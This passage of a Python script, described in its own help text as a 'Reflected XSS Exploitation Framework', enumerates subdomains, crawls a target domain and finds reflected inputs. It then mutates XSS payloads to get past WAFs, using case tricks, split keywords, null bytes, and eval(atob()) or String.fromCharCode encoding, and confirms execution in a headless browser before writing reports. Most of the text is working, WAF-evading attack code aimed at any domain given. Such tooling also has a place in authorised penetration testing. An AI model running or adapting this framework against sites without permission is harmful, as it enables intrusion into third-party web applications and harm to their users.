                reflected_info = {**vector, 'base_target_url': current_target_url, 'reflected_marker': marker,
                                  'reflection_url_with_marker': test_url, 'context_type': context_type,
                                  'html_snippet': raw_html_snippet, 'reflected_in_tag': tag_name,
                                  'reflected_in_attribute': attribute_name, 'dom_path': dom_path}
            if vector['param_type'] == 'fragment':
                sinks_to_check = {"innerHTML": f"document.body.innerHTML.includes('{marker}')", "document.write": "false", "eval": "false" }
                for sink_name, js_check_tpl in sinks_to_check.items():
                    try:
                        is_in_sink = await page.evaluate(js_check_tpl)
                        if is_in_sink:
                            print_info(f"DOM-based reflection suspected for fragment '{marker}' in sink '{sink_name}' on {test_url}")
                            dom_reflected_info = {**vector, 'base_target_url': current_target_url, 'reflected_marker': marker,
                                                  'reflection_url_with_marker': test_url, 'context_type': f"DOM_SINK_{sink_name.upper()}",
                                                  'html_snippet': f"Marker found in DOM sink: {sink_name}", 'dom_path': 'N/A_SINK_SPECIFIC'}
                            if reflected_info: reflected_info['dom_sink_info'] = dom_reflected_info
                            else: reflected_info = dom_reflected_info
                            break
                    except Exception as e_dom: print_warning(f"Error checking DOM sink {sink_name} for fragment: {e_dom}")
        except PlaywrightTimeoutError: print_warning(f"Timeout testing reflection for {vector.get('param_name','N/A')} at {vector.get('url','N/A')}")
        except Exception as e: print_error(f"Error testing reflection for {vector.get('param_name','N/A')} at {vector.get('url','N/A')}: {e} (Type: {type(e)})")
        finally: await self._close_playwright_resources(page, context)
        return reflected_info

    async def close_engine_playwright(self):
        if self._browser_instance and self._browser_instance.is_connected(): await self._browser_instance.close()
        if self._own_playwright_instance and self.playwright: await self.playwright.stop(); self.playwright = None


class PayloadGenerator:
    def __init__(self, payload_file='fireforx.txt'):
        self.payload_file = payload_file
        self.payloads = self.load_payloads()

    def load_payloads(self):
        try:
            with open(self.payload_file, 'r', encoding='utf-8') as f:
                payloads = [line.strip() for line in f if line.strip()]
            print_success(f"Successfully loaded {len(payloads)} payloads from {self.payload_file}")
            return payloads
        except FileNotFoundError:
            print_error(f"Payload file not found: {self.payload_file}. Please ensure it's in the same directory.")
            return []

    def _encode_string(self, s, encoding_type, context="html"):
        if encoding_type == "hex_entities": return ''.join(f"&#x{ord(c):x};" for c in s)
        if encoding_type == "dec_entities": return ''.join(f"&#{ord(c)};" for c in s)
        if encoding_type == "unicode_escape_js": return ''.join(f"\\u{ord(c):04x}" for c in s)
        if encoding_type == "unicode_escape_css": return ''.join(f"\\{ord(c):06x}" for c in s)
        if encoding_type == "url_single": return quote(s, safe='')
        if encoding_type == "url_double": return quote(quote(s, safe=''), safe='')
        if encoding_type == "base64": return base64.b64encode(s.encode('utf-8')).decode('utf-8')
        if encoding_type == "js_char_code": return ",".join(str(ord(c)) for c in s)
        if encoding_type == "js_hex_escape": return ''.join(f"\\x{ord(c):02x}" for c in s)
        return s

    def _get_random_event_handler(self): return random.choice(["onerror","onload","onmouseover","onfocus","onclick","onwheel","ontoggle","oncopy","oncut","onblur", "onmousemove", "onmouseout", "onmousedown", "onmouseup", "onpointerdown", "onpointermove", "onanimationstart", "onscroll", "oninput", "onchange"])
    def _get_random_tag(self): return random.choice(["img","svg","details","iframe","video","audio","div","body","input","a","button","form"])

    def get_payloads_for_context(self, context_type):
        if not self.payloads:
            return []
        if context_type == 'HTML_ATTRIBUTE_VALUE_ANGLES_ENCODED':
            return [
                " onmouseover=alert(1) ",
                " onfocus=alert(1) autofocus ",
                " onmouseover=alert(1)//",
            ]
        return self.payloads 

    async def _detect_waf(self, url, playwright_page):
        waf_detected = None
        try:
            async with httpx.AsyncClient(verify=False) as client:
                response = await client.head(url, timeout=7, headers={'User-Agent': DEFAULT_USER_AGENT})
                server_header = response.headers.get("server", "").lower()
                via_header = response.headers.get("via", "").lower()
                x_powered_by_header = response.headers.get("x-powered-by", "").lower()
                all_headers_lower = {k.lower(): v.lower() for k,v in response.headers.items()}
                for waf_keyword, waf_details in WAF_FINGERPRINTS.items():
                    if waf_keyword in server_header or waf_keyword in via_header or waf_keyword in x_powered_by_header:
                        print_success(f"Potential WAF detected: {Colors.BOLD}{waf_details['name']}{Colors.ENDC}{Colors.GREEN} via headers on {url}{Colors.ENDC}")
                        return waf_details
                    if waf_details['name'] == "Cloudflare" and "cf-ray" in all_headers_lower: return waf_details
                    if waf_details['name'] == "Incapsula" and ("x-iinfo" in all_headers_lower or "x-cdn" in all_headers_lower and "incapsula" in all_headers_lower["x-cdn"]): return waf_details
                    if waf_details['name'] == "Akamai" and "x-akamai-transformed" in all_headers_lower : return waf_details
                    if waf_details['name'] == "Sucuri CloudProxy" and "x-sucuri-id" in all_headers_lower: return waf_details
        except Exception as e: print_warning(f"WAF detection attempt failed for {url}: {e}")
        return waf_detected

    def mutate_payload(self, payload, context_type, waf_info=None):
        mutated_payload = payload
        if random.random() < 0.4: mutated_payload = ''.join(c.upper() if random.random() < 0.5 else c.lower() for c in mutated_payload)
        if "<script" in mutated_payload.lower():
            if random.random() < 0.25: mutated_payload = mutated_payload.replace("<script", "<scr\x09ipt")
            if random.random() < 0.25: mutated_payload = mutated_payload.replace("<script", "<sCrI\x0apt")
            if random.random() < 0.25: mutated_payload = mutated_payload.replace("alert", "al" + self._encode_string("e", "unicode_escape_js") + "rt")
        if "onerror" in mutated_payload.lower() and random.random() < 0.6: mutated_payload = mutated_payload.replace("onerror", self._get_random_event_handler())
        if "javascript:" in mutated_payload.lower() and random.random() < 0.3: mutated_payload = mutated_payload.replace("javascript:", f"jAvAsCrIpT{self._encode_string(':', 'url_single')}")
        if waf_info:
            print_info(f"Applying WAF-specific mutations for {waf_info['name']}")
            techniques = waf_info.get("common_techniques", [])
            if "string_splitting" in techniques and "alert('RXSS" in mutated_payload: mutated_payload = mutated_payload.replace("alert('RXSS", "alert('R'+'XSS")
            if "alternative_tags" in techniques and "<script>" in mutated_payload: mutated_payload = mutated_payload.replace("<script>", f"<{self._get_random_tag()} onload=alert('RXSS_WAF_ALTT')>")
            if "comment_bypass" in techniques: mutated_payload = f"{mutated_payload}"
            if "keyword_splitting" in techniques and "alert" in mutated_payload : mutated_payload = mutated_payload.replace("alert", "al/**/ert")
            if "null_byte" in techniques and "<script>" in mutated_payload: mutated_payload = mutated_payload.replace("<script>", "<scr%00ipt>")
        if context_type == "JAVASCRIPT_STRING":
            if random.random() < 0.4:
                q = random.choice(["'", '"', "`"])
                parts = mutated_payload.split(q)
                if len(parts) > 2 : mutated_payload = parts[0] + q + f"{q}+{q}".join(parts[1:-1]) + q + parts[-1]
            if random.random() < 0.3 and "alert" in mutated_payload:
                alert_content = re.search(r"alert\(([^)]+)\)", mutated_payload)
                if alert_content:
                    inner_alert = alert_content.group(1).strip("'\"`")
                    if random.choice([True, False]):
                        b64_payload = self._encode_string(f"alert('{inner_alert}')", "base64")
                        mutated_payload = f"eval(atob('{b64_payload}'))"
                    else:
                        char_codes = self._encode_string(f"alert('{inner_alert}')", "js_char_code")
                        mutated_payload = f"eval(String.fromCharCode({char_codes}))"
        if payload != mutated_payload: print_info(f"Mutated payload: {Colors.BOLD}{mutated_payload}{Colors.ENDC}")
        return mutated_payload


class ExecutionValidator:
    def __init__(self, playwright_instance, report_dir="xss_reports"):
        self.playwright = playwright_instance; self.report_dir = report_dir
        os.makedirs(self.report_dir, exist_ok=True); self.execution_confirmed_payloads = []
        self._browser_instance = None; self._own_playwright_instance = False

    async def _get_playwright_page_ctx(self, context_options=None):
        if not self._browser_instance or not self._browser_instance.is_connected():
            if not self.playwright: self.playwright = await async_playwright().start(); self._own_playwright_instance = True
            else: self._own_playwright_instance = False
            self._browser_instance = await self.playwright.chromium.launch(headless=True)
        ctx_opts = {'user_agent': DEFAULT_USER_AGENT, 'ignore_https_errors': True}
        if context_options: ctx_opts.update(context_options)
        context = await self._browser_instance.new_context(**ctx_opts)
        page = await context.new_page()
        return page, context

    async def _close_playwright_resources(self, page=None, context=None):
        if page: await page.close()
        if context: await context.close()

    async def test_payload_execution(self, reflection_info, payload_to_test):
        page = None; context = None; execution_details = None
        detection_flag_name = f"__rxssFrameworkExec{int(time.time()*1000)}{random.randint(0,999)}"
        payload_id_match = re.search(r"RXSS_([A-Z0-9_]+)", payload_to_test)
        payload_id = payload_id_match.group(0) if payload_id_match else "GENERIC_EXEC"

        js_interceptor_agent = f"""
            (() => {{
                window.{detection_flag_name} = null;
                const payloadId = '{payload_id}';
                const reportExecution = (type, detail) => {{
                    let message = `RXSS_EXEC_TRIGGERED_VIA_${{type.toUpperCase()}}: ${{payloadId}} -- ${{String(detail).slice(0,150)}}`;
                    console.warn(message);
                    if (!window.{detection_flag_name}) {{
                        window.{detection_flag_name} = `type: ${{type}}, detail: ${{String(detail).slice(0,100)}}`;
                    }}
                }};
                if (!window.originalAlert) {{ window.originalAlert = window.alert; }}
                window.alert = function(message) {{ reportExecution('ALERT', message); }};
                if (!window.originalPrompt) {{ window.originalPrompt = window.prompt; }}
                window.prompt = function(message) {{ reportExecution('PROMPT', message); return null; }};
                if (!window.originalConfirm) {{ window.originalConfirm = window.confirm; }}
                window.confirm = function(message) {{ reportExecution('CONFIRM', message); return true; }};
                const originalEval = window.eval;
                window.eval = function(str) {{
                    if (typeof str === 'string' && (str.includes(payloadId) || str.includes('RXSS_') || str.toLowerCase().includes('alert') || str.toLowerCase().includes('prompt') || str.toLowerCase().includes('confirm'))) {{
                        reportExecution('EVAL', str);
                    }}
                    return originalEval.apply(this, arguments);
                }};
                const originalDocWrite = document.write;
                document.write = function(str) {{
                    if (typeof str === 'string' && (str.includes(payloadId) || str.includes('RXSS_'))) {{
                        reportExecution('DOC_WRITE', str);
                    }}
                    return originalDocWrite.apply(this, arguments);
                }};
                const originalDocWriteln = document.writeln;
                document.writeln = function(str) {{
                    if (typeof str === 'string' && (str.includes(payloadId) || str.includes('RXSS_'))) {{
                        reportExecution('DOC_WRITELN', str);
                    }}
                    return originalDocWriteln.apply(this, arguments);
                }};
            }})();
        """
        try:
            target_url = reflection_info.get('base_target_url', reflection_info['url'])
            param_name = reflection_info['param_name']; param_type = reflection_info['param_type']
            parsed_url = urlparse(target_url); test_url = target_url
            request_method = reflection_info.get('method', 'GET').upper()
            request_data_dict = None; request_json_data_str = None; request_headers = {}; context_options = {}
            all_form_fields = reflection_info.get('all_form_fields', {})

            if param_type == 'query':
                request_method = 'GET'; current_q_params = parse_qs(urlparse(reflection_info['reflection_url_with_marker']).query)
                current_q_params[param_name] = [payload_to_test]; new_query = urlencode(current_q_params, doseq=True)
                test_url = parsed_url._replace(query=new_query).geturl()
            elif param_type == 'path':
                request_method = 'GET'; path_parts = list(filter(None, parsed_url.path.split('/')))
                segment_index = int(param_name.split('_')[-1])
                if 0 <= segment_index < len(path_parts):
                    path_parts[segment_index] = payload_to_test; new_path = "/" + "/".join(path_parts)
                    if parsed_url.path.endswith('/') and not new_path.endswith('/'): new_path += '/'
                    test_url = parsed_url._replace(path=new_path).geturl()
                else: return None
            elif param_type == 'form_field':
                if request_method == 'GET':
                    current_q_params = parse_qs(urlparse(reflection_info['reflection_url_with_marker']).query)
                    temp_form_data = {**all_form_fields, param_name: payload_to_test}
                    new_query = urlencode(temp_form_data, doseq=True); test_url = parsed_url._replace(query=new_query).geturl()
                elif request_method == 'POST':
                    request_data_dict = {**all_form_fields, param_name: payload_to_test}
                    test_url = reflection_info.get('reflection_url_with_marker', target_url)
                else: return None
            elif param_type == 'json_key':
                request_method = 'POST'; request_json_data_str = json.dumps({param_name: payload_to_test, "otherData": "testForExec"})
                request_headers['Content-Type'] = 'application/json'; test_url = reflection_info.get('reflection_url_with_marker', target_url)
            elif param_type == 'header':
                request_headers[param_name] = payload_to_test; test_url = reflection_info.get('reflection_url_with_marker', target_url)
            elif param_type == 'cookie':
                context_options['extra_http_headers'] = {'Cookie': f"{param_name}={payload_to_test}"}; test_url = reflection_info.get('reflection_url_with_marker', target_url)
            elif param_type in ['localStorage', 'sessionStorage']:
                request_method = 'GET'; test_url = reflection_info.get('reflection_url_with_marker', target_url)
            elif param_type == 'fragment' or param_type.startswith("DOM_SINK"):
                request_method = 'GET'; test_url = parsed_url._replace(fragment=payload_to_test).geturl()
            else: print_warning(f"Execution validation for param_type '{param_type}' not fully implemented."); return None

            print_info(f"Attempting to execute payload ({Colors.BOLD}{payload_id}{Colors.ENDC}) at: {test_url} (Method: {request_method})")
            page, context = await self._get_playwright_page_ctx(context_options=context_options)
            if request_headers: await context.set_extra_http_headers({**context_options.get('extra_http_headers',{}), **request_headers})
            console_messages = []; page.on("console", lambda msg: console_messages.append(f"{msg.type}: {msg.text}"))
            await page.add_init_script(js_interceptor_agent)

            if param_type in ['localStorage', 'sessionStorage']:
                storage_type = param_type; key_name = param_name
                await page.evaluate(f"window.{storage_type}.setItem('{key_name}', '{payload_to_test}');")
                await page.goto(test_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="networkidle")
                await page.reload(wait_until="networkidle")
            elif request_method == 'POST':
                if request_data_dict:
                    await page.goto("about:blank")
                    form_fields_html = "".join([f"<input type='hidden' name='{html.escape(k)}' value='{html.escape(v)}'>" for k,v in request_data_dict.items()])
                    form_html = f"<form id='execForm' action='{html.escape(test_url)}' method='POST'>{form_fields_html}</form><script>document.getElementById('execForm').submit();</script>"
                    await page.set_content(form_html, wait_until="domcontentloaded")
                    await page.wait_for_load_state("networkidle", timeout=DEFAULT_TIMEOUT * 1000 / 2)
                elif request_json_data_str:
                    async with httpx.AsyncClient(verify=False) as client:
                        post_response = await client.post(test_url, content=request_json_data_str, headers=request_headers)
                        await page.goto(target_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="domcontentloaded")
            else: await page.goto(test_url, timeout=DEFAULT_TIMEOUT * 1000, wait_until="domcontentloaded")

            await asyncio.sleep(random.uniform(2.5, 4.0))

            execution_trigger_info = await page.evaluate(f"window.{detection_flag_name}")
            console_triggers = [msg for msg in console_messages if "RXSS_EXEC_TRIGGERED_VIA_" in msg]

            if execution_trigger_info or console_triggers:
                triggered_by = execution_trigger_info if execution_trigger_info else (console_triggers[0] if console_triggers else "UNKNOWN_SINK")
                print_success(
                    f"XSS Confirmed! URL: {Colors.BOLD}{target_url}{Colors.ENDC}, Param: {Colors.BOLD}{param_name}{Colors.ENDC} ({param_type}), "
                    f"Context: {Colors.BOLD}{reflection_info.get('context_type', 'UNKNOWN')}{Colors.ENDC}, "
                    f"Payload ID: {Colors.BOLD}{payload_id}{Colors.ENDC}, Trigger: {Colors.BOLD}{(triggered_by.split(':')[0].replace('type: ','') if isinstance(triggered_by, str) else 'FLAG')}{Colors.ENDC}"
                )
                screenshot_filename = f"{sanitize_filename(target_url)}_{sanitize_filename(payload_id)}_{random.randint(100,999)}.png"
                screenshot_path = os.path.join(self.report_dir, screenshot_filename)
                try: await page.screenshot(path=screenshot_path, full_page=True); print_success(f"Screenshot saved to: {screenshot_path}")
                except Exception as ss_error: print_warning(f"Failed to take screenshot: {ss_error}"); screenshot_path = "N/A"
                execution_details = {
                    'vulnerable_url': target_url, 'parameter_name': param_name, 'parameter_type': param_type,
                    'payload_used': payload_to_test, 'payload_id': payload_id, 'execution_url_or_action': test_url,
                    'reflection_context': reflection_info.get('context_type', 'UNKNOWN'),
                    'dom_path_reflection': reflection_info.get('dom_path', 'N/A'),
                    'html_snippet_at_reflection': reflection_info.get('html_snippet', 'N/A'),
                    'screenshot_path': screenshot_path,
                    'console_logs_snippet': console_triggers[:5],
                    'detection_method': triggered_by,
                    'cvss_estimate': "High (Reflected XSS Confirmed)"
                }
                self.execution_confirmed_payloads.append(execution_details)
            else: print_warning(f"Payload ({payload_id}) did not trigger execution confirmation: {payload_to_test} at {test_url}")
        except PlaywrightTimeoutError: print_warning(f"Timeout during execution validation for {payload_id} at {test_url if 'test_url' in locals() else target_url}")
        except Exception as e: print_error(f"Error during execution validation for {payload_id} at {test_url if 'test_url' in locals() else target_url}: {e} (Type: {type(e)})")
        finally: await self._close_playwright_resources(page, context)
        return execution_details

    async def close_validator_playwright(self):
        if self._browser_instance and self._browser_instance.is_connected(): await self._browser_instance.close()
        if self._own_playwright_instance and self.playwright: await self.playwright.stop(); self.playwright = None


class Reporter:
    def __init__(self, report_dir="xss_reports"):
        self.report_dir = report_dir; os.makedirs(self.report_dir, exist_ok=True)

    def generate_report(self, confirmed_vulnerabilities, target_domain):
        if not confirmed_vulnerabilities: print_info("No confirmed XSS vulnerabilities to report."); return
        report_time = int(time.time()); report_basename = f"xss_report_{sanitize_filename(target_domain)}_{report_time}"
        json_report_path = os.path.join(self.report_dir, f"{report_basename}.json")
        with open(json_report_path, 'w') as f: json.dump(confirmed_vulnerabilities, f, indent=4)
        print_success(f"JSON report saved to: {Colors.BOLD}{json_report_path}{Colors.ENDC}")
        md_report_path = os.path.join(self.report_dir, f"{report_basename}.md")
        with open(md_report_path, 'w', encoding='utf-8') as f:
            f.write(f"# XSS Vulnerability Report for {target_domain}\n\nGenerated on: {time.ctime(report_time)}\n\n")
            for i, vuln in enumerate(confirmed_vulnerabilities):
                f.write(f"## Vulnerability #{i+1}: {vuln.get('payload_id', 'Generic XSS')}\n\n"
                        f"- **URL (Original/Base):** `{vuln['vulnerable_url']}`\n"
                        f"- **Execution URL/Action:** `{vuln['execution_url_or_action']}`\n"
                        f"- **Parameter:** `{vuln['parameter_name']}` ({vuln['parameter_type']})\n"
                        f"- **Payload:** \n```html\n{html.escape(vuln['payload_used'])}\n```\n"
                        f"- **Reflection Context:** `{vuln['reflection_context']}`\n"
                        f"- **DOM Path (Experimental):** `{html.escape(vuln.get('dom_path_reflection', 'N/A'))}`\n"
                        f"- **HTML Snippet at Reflection:**\n```html\n{html.escape(vuln.get('html_snippet_at_reflection', 'N/A'))}\n```\n"
                        f"- **Detection Method:** {html.escape(str(vuln['detection_method']))}\n"
                        f"- **Screenshot:** `{os.path.basename(vuln['screenshot_path'])}` (Relative to report directory)\n"
                        f"- **CVSS Estimate:** {vuln['cvss_estimate']}\n")
                if vuln.get('console_logs_snippet'):
                    f.write(f"- **Relevant Console Logs:**\n")
                    for log_entry in vuln['console_logs_snippet']: f.write(f"  ```\n  {html.escape(log_entry)}\n  ```\n")
                f.write("\n---\n\n")
        print_success(f"Markdown report saved to: {Colors.BOLD}{md_report_path}{Colors.ENDC}")
        html_report_path = os.path.join(self.report_dir, f"{report_basename}.html")
        html_content = f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>XSS Report for {target_domain}</title><style>body {{ font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; background-color: #f4f4f4; color: #333; }}
.container {{ background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }}
h1 {{ color: #333; border-bottom: 2px solid #333; padding-bottom: 10px; }} h2 {{ color: #555; margin-top: 30px; border-bottom: 1px solid #ccc; padding-bottom: 5px;}}
ul {{ list-style-type: none; padding-left: 0; }} li strong {{ color: #444; min-width:180px; display:inline-block; }}
pre {{ background-color: #eee; padding: 10px; border-radius: 4px; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word; border: 1px solid #ddd;}}
code {{ background-color: #f0f0f0; padding: 2px 4px; border-radius:3px; font-family:monospace;}}
.screenshot-link {{ color: #007bff; text-decoration: none; }} .screenshot-link:hover {{ text-decoration: underline; }}
hr {{ border: 0; height: 1px; background: #ccc; margin: 20px 0; }}</style></head><body><div class="container">
<h1>XSS Vulnerability Report for {target_domain}</h1><p>Generated on: {time.ctime(report_time)}</p>"""
        for i, vuln in enumerate(confirmed_vulnerabilities):
            html_content += f"""<h2>Vulnerability #{i+1}: {html.escape(vuln.get('payload_id', 'Generic XSS'))}</h2><ul>
<li><strong>URL (Original/Base):</strong> <code>{html.escape(vuln['vulnerable_url'])}</code></li>
<li><strong>Execution URL/Action:</strong> <code>{html.escape(vuln['execution_url_or_action'])}</code></li>
<li><strong>Parameter:</strong> <code>{html.escape(vuln['parameter_name'])}</code> ({html.escape(vuln['parameter_type'])})</li>
<li><strong>Payload:</strong> <pre>{html.escape(vuln['payload_used'])}</pre></li>
<li><strong>Reflection Context:</strong> <code>{html.escape(vuln['reflection_context'])}</code></li>
<li><strong>DOM Path (Experimental):</strong> <code>{html.escape(vuln.get('dom_path_reflection', 'N/A'))}</code></li>
<li><strong>HTML Snippet at Reflection:</strong> <pre>{html.escape(vuln.get('html_snippet_at_reflection', 'N/A'))}</pre></li>
<li><strong>Detection Method:</strong> {html.escape(str(vuln['detection_method']))}</li>
<li><strong>Screenshot:</strong> <a href="{html.escape(os.path.basename(vuln['screenshot_path']))}" target="_blank" class="screenshot-link">{html.escape(os.path.basename(vuln['screenshot_path']))}</a> (Click to view)</li>
<li><strong>CVSS Estimate:</strong> {html.escape(vuln['cvss_estimate'])}</li>"""
            if vuln.get('console_logs_snippet'):
                html_content += "<li><strong>Relevant Console Logs:</strong><ul>"
                for log_entry in vuln['console_logs_snippet']: html_content += f"<li><pre>{html.escape(log_entry)}</pre></li>"
                html_content += "</ul></li>"
            html_content += "</ul>\n<hr>\n"
        html_content += """</div></body></html>"""
        with open(html_report_path, 'w', encoding='utf-8') as f: f.write(html_content)
        print_success(f"HTML report saved to: {Colors.BOLD}{html_report_path}{Colors.ENDC}")


async def main():
    global MAX_CONCURRENT_REQUESTS, SILENT_MODE 

    parser = argparse.ArgumentParser(description="Reflected XSS Exploitation Framework")
    parser.add_argument("target_domain", help="Target domain (e.g., example.com).")
    parser.add_argument("-d", "--depth", type=int, default=CRAWL_DEPTH_DEFAULT, help="Max crawl depth for links.")
    parser.add_argument("-o", "--output-dir", default="xss_reports", help="Directory to save reports and screenshots.")
    parser.add_argument("--custom-header", action="append", help="Custom header (e.g., 'Authorization: Bearer token'). Multiple allowed.")
    parser.add_argument("--custom-cookie", action="append", help="Custom cookie (e.g., 'session_id=abcdef123'). Multiple allowed.")
    parser.add_argument("--proxy", help="Proxy server (e.g., http://127.0.0.1:8080). Basic support.")
    parser.add_argument("--threads", type=int, default=MAX_CONCURRENT_REQUESTS, help="Max concurrent tasks for network operations.")
    parser.add_argument("--silent", action="store_true", help="Run in silent mode (less console output).")

    args = parser.parse_args()

    MAX_CONCURRENT_REQUESTS = args.threads 
    SILENT_MODE = args.silent

    custom_headers = {}; custom_cookies = {}
    if args.custom_header:
        for header in args.custom_header:
            if ':' in header: name, value = header.split(':', 1); custom_headers[name.strip()] = value.strip()
            else: print_warning(f"Invalid custom header format: {header}. Skipping.")
    if args.custom_cookie:
        for cookie_str in args.custom_cookie:
            if '=' in cookie_str: name, value = cookie_str.split('=', 1); custom_cookies[name.strip()] = value.strip()
            else: print_warning(f"Invalid custom cookie format: {cookie_str}. Skipping.")
    if args.proxy: print_warning("Proxy support is basic. Playwright proxying requires browser launch arguments.")

    print_info(f"Starting XSS scan for: {Colors.BOLD}{args.target_domain}{Colors.ENDC} with {Colors.BOLD}{MAX_CONCURRENT_REQUESTS}{Colors.ENDC} concurrent tasks.")
    shared_playwright_instance = None; reflection_engine = None; execution_validator = None
    try:
        shared_playwright_instance = await async_playwright().start()
        enumerator = SubdomainEnumerator(args.target_domain); subdomains = await enumerator.enumerate()
        initial_scan_targets = []
        if subdomains: initial_scan_targets.extend([f"https://{sub}" for sub in subdomains]); initial_scan_targets.extend([f"http://{sub}" for sub in subdomains])
        else: print_warning(f"No live subdomains. Scanning main domain: {args.target_domain}"); initial_scan_targets.extend([f"https://{args.target_domain}", f"http://{args.target_domain}"])
        initial_scan_targets = sorted(list(set(initial_scan_targets)))
        if not initial_scan_targets: print_error("No valid initial targets to scan. Exiting."); return


        all_discovered_endpoints = []; crawl_semaphore = asyncio.Semaphore(max(1, MAX_CONCURRENT_REQUESTS // 2))
        target_registered_domain = tldextract.extract(args.target_domain).registered_domain
        async def crawl_target_url_wrapper(url_to_crawl):
            async with crawl_semaphore:
                print_info(f"Starting crawl for root: {Colors.BOLD}{url_to_crawl}{Colors.ENDC}")
                crawler = Crawler(url_to_crawl, depth=args.depth, playwright_instance=shared_playwright_instance, target_domain_registered_part=target_registered_domain)
                endpoints = await crawler.crawl_all(); all_discovered_endpoints.extend(endpoints)
                print_success(f"Crawling finished for {Colors.BOLD}{url_to_crawl}{Colors.ENDC}. Found {len(endpoints)} potential endpoints.")
        await asyncio.gather(*(crawl_target_url_wrapper(url) for url in initial_scan_targets))

        if not all_discovered_endpoints: print_warning("Crawler found no endpoints. Exiting."); return
        final_endpoints_list = list(set(all_discovered_endpoints))
        print_success(f"Crawler: Found {Colors.BOLD}{len(final_endpoints_list)}{Colors.ENDC}{Colors.GREEN} unique potential endpoints.{Colors.ENDC}")

        input_discoverer = InputDiscoverer(final_endpoints_list, custom_headers=custom_headers, custom_cookies=custom_cookies)
        potential_vectors = await input_discoverer.discover(playwright_instance=shared_playwright_instance)
        if not potential_vectors: print_warning("No input vectors identified. Exiting."); return

        reflection_engine = ReflectionEngine(playwright_instance=shared_playwright_instance)
        reflected_vectors = []; vectors_by_url = {}
        for pv in potential_vectors:
            base_url_for_pv = pv['url'] if pv['url'] != '*' else (random.choice(initial_scan_targets) if initial_scan_targets else f"https://{args.target_domain}")
            if pv['url'] == '*':
                for scan_target_url_base in initial_scan_targets: vectors_by_url.setdefault(scan_target_url_base, []).append(pv)
            else: vectors_by_url.setdefault(base_url_for_pv, []).append(pv)

        reflection_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
        async def check_vectors_for_url_group(url_group_base, vectors_in_group):
            async with reflection_semaphore:
                results_for_group = []
                for vector_item in vectors_in_group:
                    res = await reflection_engine.check_reflection(vector_item, url_group_base)
                    if res: results_for_group.append(res)
                return results_for_group
        all_reflection_results_nested = await asyncio.gather(*(check_vectors_for_url_group(url_base, vecs) for url_base, vecs in vectors_by_url.items()), return_exceptions=True)
        for res_group in all_reflection_results_nested:
            if isinstance(res_group, Exception): print_error(f"Reflection check task group failed: {res_group}")
            elif res_group: reflected_vectors.extend(res_group)

        if not reflected_vectors: print_warning("No input reflections found. Exiting."); return
        unique_reflected_vectors = []; seen_reflection_keys = set()
        for rv in reflected_vectors:
            key = (rv['param_name'], rv['param_type'], rv.get('context_type', 'UNKNOWN'), rv.get('html_snippet', '')[:50], rv.get('base_target_url'))
            if key not in seen_reflection_keys: unique_reflected_vectors.append(rv); seen_reflection_keys.add(key)
        reflected_vectors = unique_reflected_vectors
        print_success(f"Reflection Engine: Found {Colors.BOLD}{len(reflected_vectors)}{Colors.ENDC}{Colors.GREEN} unique reflection points.{Colors.ENDC}")

        payload_generator = PayloadGenerator()
        execution_validator = ExecutionValidator(playwright_instance=shared_playwright_instance, report_dir=args.output_dir)
        exec_semaphore = asyncio.Semaphore(max(1,MAX_CONCURRENT_REQUESTS // 2))
        async def test_vector_with_payloads(reflected_vec):
            async with exec_semaphore:
                context_type = reflected_vec.get('context_type', 'UNKNOWN')
                waf_info = await payload_generator._detect_waf(reflected_vec['base_target_url'], None)
                payloads_for_context = payload_generator.get_payloads_for_context(context_type)
                print_info(f"Testing {Colors.BOLD}{len(payloads_for_context)}{Colors.ENDC}{Colors.CYAN} payloads for {Colors.BOLD}{reflected_vec['param_name']}{Colors.ENDC}{Colors.CYAN} in {reflected_vec['base_target_url']} (Context: {context_type}, DOM Path: {reflected_vec.get('dom_path','N/A')}){Colors.ENDC}")
                for base_payload in payloads_for_context:
                    mutated_payload = payload_generator.mutate_payload(base_payload, context_type, waf_info)
                    exec_result = await execution_validator.test_payload_execution(reflected_vec, mutated_payload)
                    
        await asyncio.gather(*(test_vector_with_payloads(rv) for rv in reflected_vectors))

        reporter = Reporter(report_dir=args.output_dir); reporter.generate_report(execution_validator.execution_confirmed_payloads, args.target_domain)
        print_info(f"{Colors.BOLD}XSS Scan Completed.{Colors.ENDC}")
    except Exception as e: print_error(f"An unexpected error occurred in main: {e}"); import traceback; traceback.print_exc()
    finally:
        if reflection_engine: await reflection_engine.close_engine_playwright()
        if execution_validator: await execution_validator.close_validator_playwright()
        if shared_playwright_instance:
            try:
                print_info("Attempting to stop main shared Playwright object...")
                await shared_playwright_instance.stop()
                print_info("Main shared Playwright object stopped successfully.")
            except Exception as e_pw_stop: print_warning(f"Note: Error stopping main shared Playwright object (might be already stopped): {e_pw_stop}")

if __name__ == "__main__":
    try: from playwright.async_api import Error as PlaywrightError
    except ImportError: print_error("Playwright library not found. Install: pip install playwright && playwright install"); exit(1)
    try: import httpx
    except ImportError: print_error("httpx library not found. Install: pip install httpx[http2]"); exit(1)
    try: import tldextract
    except ImportError: print_error("tldextract library not found. Install: pip install tldextract"); exit(1)
    try: import html
    except ImportError: print_error("html library not found (standard in Python 3.2+). Check Python env."); exit(1)
    try:
        process_check = subprocess.run(["subfinder", "-version"], capture_output=True, check=False, text=True)
        if process_check.returncode == 0 : print_info("Subfinder found.")
        else: print_warning(f"Subfinder check failed (Code: {process_check.returncode}): {process_check.stderr.strip()}.")
    except FileNotFoundError: print_warning("Subfinder not found. Subdomain enum limited.")
    except Exception as e_subfinder_check: print_warning(f"Subfinder check error: {e_subfinder_check}")
    asyncio.run(main())